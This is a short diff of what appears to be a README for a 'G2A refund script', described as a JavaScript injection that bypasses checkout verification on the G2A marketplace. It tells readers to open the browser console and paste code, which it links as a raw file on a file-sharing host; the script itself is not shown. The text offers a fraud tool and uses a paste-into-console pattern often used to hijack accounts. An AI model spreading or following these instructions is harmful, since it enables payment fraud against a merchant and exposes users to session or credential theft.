@@ -1,4 +1,4 @@
-G2A REFUND SCRIPT JAVASCRIPT INJECTION METHOD
+## G2A REFUND SCRIPT JAVASCRIPT INJECTION METHOD
 
 > **Lightweight JavaScript injection method to bypass G2A’s checkout verification prompts.**
 
@@ -24,6 +24,5 @@ This script targets specific DOM elements in G2A’s checkout iframe (J2B - J2B 
 3. Navigate to the **Console** tab.
 4. Paste the following code and hit `Enter`:
 
-```javascript
-// 
-](https://files.catbox.moe/xd7fl4.txt)
+
+[G2A RAW JAVASCRIPT INJECTION SCRIPT](https://files.catbox.moe/xd7fl4.txt)
